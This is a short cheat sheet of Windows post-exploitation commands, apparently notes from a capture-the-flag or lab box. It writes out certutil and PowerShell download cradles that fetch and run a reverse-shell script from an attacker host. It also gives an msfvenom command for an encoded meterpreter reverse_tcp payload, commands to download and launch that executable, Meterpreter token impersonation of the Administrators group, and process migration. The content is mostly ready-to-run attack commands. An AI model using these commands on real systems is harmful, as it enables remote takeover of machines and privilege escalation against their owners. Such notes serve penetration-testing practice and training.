# download a file
certutil.exe -urlcache -f http://10.18.112.115/Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1

# download with powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.112.115/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.112.115 -Port 4444

# search for a file with pattern from powershell
Get-ChildItem -Path C:\ -name -recurse user*txt

# using msfvenom create a meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.112.115 LPORT=4444 -f exe -o reverse.exe

# use the same method 
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.18.112.115/reverse.exe','reverse.exe')"
Start-Process reverse.exe

# what privs you have
whoami /priv

# load the incognito module
load incognito

# list the tokens
list_tokens -g

# impersonate privileged user
impersonate_token "BUILTIN\Administrators" 

# although you can impersonate a certain user, you cannot get the permissions.
# your permission level will still be the process 
# Note: Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). 

# listing of the process and migrating to the processes
ps
migrate <to-pid>




